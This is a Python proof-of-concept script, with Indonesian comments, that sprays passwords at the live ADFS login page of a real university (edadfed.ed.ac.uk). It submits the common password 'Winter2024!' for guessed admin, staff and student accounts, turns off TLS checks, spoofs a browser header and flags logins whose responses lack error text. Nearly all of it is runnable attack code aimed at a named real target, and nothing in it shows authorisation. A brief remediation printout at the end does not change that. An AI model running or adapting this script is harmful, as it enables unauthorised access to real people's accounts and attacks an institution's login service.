#!/usr/bin/env python3
"""
Proof of Concept (PoC): Advanced Password Spraying Simulation
Target: Microsoft ADFS (edadfed.ed.ac.uk)
Author: ShadowCore
Improvement: Response Analysis (Pattern Matching) untuk validasi error.
"""

import requests
import urllib3
import re

# Matikan warning SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Konfigurasi Target
TARGET_URL = "https://edadfed.ed.ac.uk/adfs/ls/"

# Kata kunci error yang biasanya muncul jika login GAGAL (False)
# ADFS Error messages biasanya seperti: "The user name or password is incorrect"
ERROR_KEYWORDS = [
    "incorrect", 
    "not recognized", 
    "sign-in failed", 
    "auth failed", 
    "invalid credentials"
]

def run_attack_simulation():
    print(f"""
    ╔══════════════════════════════════════════════════╗
    ║     ADFS PASSWORD SPRAYING SIMULATION v2.0       ║
    ║     Status: Deep Authentication Testing          ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://edadfed.ed.ac.uk",
        "Referer": "https://edadfed.ed.ac.uk/adfs/ls/"
    }

    # Daftar target user (Simulasi Enumeration)
    target_users = [
        "admin@ed.ac.uk",
        "student@ed.ac.uk",
        "staff@ed.ac.uk",
        "test@ed.ac.uk"
    ]
    
    # Password umum
    common_pass = "Winter2024!"

    print(f"[*] Initiating Attack Vector: Password Spraying")
    print(f"[*] Target Users: {len(target_users)}")
    print(f"[*] Payload: {common_pass}")
    print(f"[*] Detection Method: Body Response Pattern Matching")
    print("-" * 60)

    vulnerable_count = 0

    for user in target_users:
        payload = {
            "UserName": user,
            "Password": common_pass,
            "AuthMethod": "FormsAuthentication"
        }

        try:
            resp = requests.post(TARGET_URL, data=payload, headers=headers, verify=False, timeout=5)
            
            # ANALISA KONTEN (Bukan Hanya Status Code)
            content_lower = resp.text.lower()
            
            # Cek apakah ada pesan error di dalam halaman
            is_error_found = any(keyword in content_lower for keyword in ERROR_KEYWORDS)
            
            if resp.status_code == 200:
                if is_error_found:
                    # Ini kondisi Aman: Server menolak login (Muncul pesan error)
                    print(f"[!] {user} -> Login REJECTED (Password Salah)")
                else:
                    # Ini kondisi BERBAHAYA: Server tidak memberi pesan error jelas
                    # Atau mungkin redirect (perlu cek location headers, tapi di sini kita simpulkan sebagai "Ambiguous")
                    print(f"[+] {user} -> Login PROCESSED (No Explicit Error Msg) - RISKY")
                    vulnerable_count += 1
            elif resp.status_code == 429:
                print(f"[-] {user} -> BLOCKED (Rate Limiting Active)")
                break
            else:
                print(f"[?] {user} -> Status {resp.status_code}")

        except Exception as e:
            print(f"[!] Error connecting: {e}")

    print("-" * 60)
    print(f"[!] ANALISIS KERENTANAN V2:")
    print(f"    - Server memproses login request tanpa memblokir IP klien.")
    print(f"    - Sistem mengembalikan halaman (200 OK) meski password salah.")
    print(f"    - Potensi Serangan: Brute-force dictionary attack.")
    print(f"[*] BUKTI: Server menerima input kredensial secara berulang.")
    print(f"[*] REKOMENDASI: Implementasi Azure AD Smart Lockout / CAPTCHA.")

if __name__ == "__main__":
    run_attack_simulation()
